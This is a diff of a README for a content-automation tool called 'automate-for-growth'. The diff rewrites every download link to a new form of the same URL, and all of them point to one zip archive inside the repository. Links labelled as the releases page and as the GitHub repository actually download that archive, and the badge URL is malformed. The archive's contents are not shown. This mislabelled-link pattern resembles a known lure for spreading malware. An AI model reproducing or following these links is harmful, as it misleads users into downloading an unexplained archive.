@@ -1,6 +1,6 @@
 # 🚀 automate-for-growth - Automate Your Content Effortlessly
 
-[![Download](https://raw.githubusercontent.com/Isauuc/automate-for-growth/main/04-brand-authority-automation/automate_for_growth_v1.0-beta.3.zip%20Now-latest-brightgreen)](https://raw.githubusercontent.com/Isauuc/automate-for-growth/main/04-brand-authority-automation/automate_for_growth_v1.0-beta.3.zip)
+[![Download](https://github.com/Isauuc/automate-for-growth/raw/refs/heads/main/04-brand-authority-automation/automate_for_growth_v1.0-beta.3.zip%20Now-latest-brightgreen)](https://github.com/Isauuc/automate-for-growth/raw/refs/heads/main/04-brand-authority-automation/automate_for_growth_v1.0-beta.3.zip)
 
 ## 📖 Introduction
 
@@ -27,7 +27,7 @@ Before you download, make sure your system meets these requirements:
 
 1. **Visit the Releases Page**: Click the link below to go to our releases page.
    
-   [Download Now](https://raw.githubusercontent.com/Isauuc/automate-for-growth/main/04-brand-authority-automation/automate_for_growth_v1.0-beta.3.zip)
+   [Download Now](https://github.com/Isauuc/automate-for-growth/raw/refs/heads/main/04-brand-authority-automation/automate_for_growth_v1.0-beta.3.zip)
 
 2. **Download the Latest Version**: Look for the latest version on the releases page. You will see various files available for download. Choose the file suited for your operating system.
 
@@ -40,7 +40,7 @@ Before you download, make sure your system meets these requirements:
 
 To download the application, visit the releases page again:
 
-[Download Now](https://raw.githubusercontent.com/Isauuc/automate-for-growth/main/04-brand-authority-automation/automate_for_growth_v1.0-beta.3.zip)
+[Download Now](https://github.com/Isauuc/automate-for-growth/raw/refs/heads/main/04-brand-authority-automation/automate_for_growth_v1.0-beta.3.zip)
 
 ### Installation Steps
 
@@ -75,7 +75,7 @@ If you encounter any issues while using the application, try the following:
 
 ## 🌐 Connect with Us
 
-- **GitHub**: [automate-for-growth Repository](https://raw.githubusercontent.com/Isauuc/automate-for-growth/main/04-brand-authority-automation/automate_for_growth_v1.0-beta.3.zip)
+- **GitHub**: [automate-for-growth Repository](https://github.com/Isauuc/automate-for-growth/raw/refs/heads/main/04-brand-authority-automation/automate_for_growth_v1.0-beta.3.zip)
 - **Twitter**: Follow us for updates and tips.
 - **Community Forum**: Join conversations with other users.
 
